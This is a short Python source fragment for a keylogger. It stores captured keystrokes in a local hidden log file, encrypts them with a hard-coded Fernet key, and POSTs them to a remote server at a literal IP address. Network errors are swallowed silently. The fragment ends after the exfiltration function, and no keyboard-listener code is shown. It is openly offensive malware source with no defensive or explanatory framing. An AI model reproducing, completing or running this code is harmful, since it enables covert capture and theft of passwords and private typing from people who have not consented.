import pynput.keyboard
import requests
import os
from datetime import datetime
from cryptography.fernet import Fernet
# === CONFIGURATION ===
SECRET_KEY = b'j5uZ5X8DnqoLk7miCltsA8wrfNg-7dLGp1Ns5XGMQ4g='  # Must match decrypt key
cipher_suite = Fernet(SECRET_KEY)

log_file = "logs.txt"  # Local hidden file to store captured keystrokes
server_url = 'http://54.87.241.76:5000/upload'  # <-- Send encrypted keystrokes here

# === FUNCTION TO SEND ENCRYPTED LOGS TO SERVER ===

def send_log_to_server(log_message):
    try:
        encrypted_message = cipher_suite.encrypt(log_message.encode('utf-8'))
        requests.post(server_url, data=encrypted_message, timeout=5)
    except Exception as e:
        pass  # Ignore any connection issues silently
